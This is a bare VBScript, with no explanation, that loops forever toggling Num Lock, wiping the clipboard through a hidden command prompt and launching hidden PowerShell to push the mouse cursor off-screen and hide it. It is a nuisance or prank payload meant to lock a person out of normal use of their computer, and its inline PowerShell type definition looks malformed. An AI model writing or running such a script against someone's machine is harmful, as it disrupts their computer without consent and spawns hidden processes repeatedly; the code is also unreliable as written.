
Set WshShell = WScript.CreateObject("WScript.Shell")
Do
    WshShell.SendKeys "{NUMLOCK}"
    CreateObject("WScript.Shell").Run "cmd /c echo off | clip", 0, True
    CreateObject("WScript.Shell").Exec("powershell -window hidden -command ""Add-Type -TypeDefinition '[DllImport(\"user32.dll\")] public static extern bool SetCursorPos(int X, int Y); [DllImport(\"user32.dll\")] public static extern bool ShowCursor(bool bShow);' -Name Win32Funcs; [Win32Funcs]::SetCursorPos(-10000, -10000); [Win32Funcs]::ShowCursor($false)""")
    WScript.Sleep 50
Loop
